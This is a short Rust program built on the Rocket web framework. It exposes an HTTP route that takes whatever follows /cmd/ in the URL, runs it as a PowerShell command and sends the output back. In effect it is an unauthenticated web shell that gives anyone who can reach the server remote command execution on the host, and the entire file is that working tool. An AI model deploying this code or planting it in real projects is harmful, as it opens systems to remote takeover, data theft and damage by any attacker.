#![feature(proc_macro_hygiene, decl_macro)]
use std::process::Command;
#[macro_use]
extern crate rocket;

#[get("/<cmd>")]
fn cmd(cmd: String) -> String {
    let output = Command::new("powershell")
        .args(["/C", &cmd])
        .output()
        .expect("failed to execute process");
    let output = output.stdout;
    format!("Command:{}\r\nOutput:{:?}", cmd, String::from_utf8(output)
        .unwrap()
        .trim())
}

fn main() {
    rocket::ignite()
        .mount("/cmd", routes![cmd])
        .launch();
}
